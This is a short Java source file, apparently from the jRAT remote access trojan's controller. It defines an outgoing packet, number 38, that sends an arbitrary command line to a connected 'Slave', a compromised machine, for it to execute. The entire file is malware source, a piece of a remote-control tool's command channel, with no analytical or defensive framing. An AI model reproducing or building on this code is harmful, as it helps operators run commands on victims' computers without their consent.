package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet38RunCommand extends AbstractOutgoingPacket {

	private String command;

	public Packet38RunCommand(String command) {
		this.command = command;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeLine(command);
	}

	@Override
	public short getPacketId() {
		return 38;
	}

}
